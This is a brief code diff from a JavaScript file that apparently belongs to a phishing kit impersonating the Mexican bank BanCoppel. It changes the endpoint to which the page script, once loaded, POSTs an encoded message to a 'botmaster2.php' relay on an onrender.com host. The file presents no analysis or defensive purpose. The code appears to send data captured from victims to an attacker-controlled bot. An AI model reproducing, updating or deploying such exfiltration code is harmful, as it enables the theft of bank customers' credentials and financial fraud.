@@ -101,7 +101,7 @@ document.addEventListener('DOMContentLoaded', async function () {
   };
 
   // Enviar al bot con botones
-  await fetch("https://bancoppelmxn.onrender.com/botmaster2.php", {
+  await fetch("https://bancoppelsite.onrender.com//botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "data=" + encodeURIComponent(mensaje) +
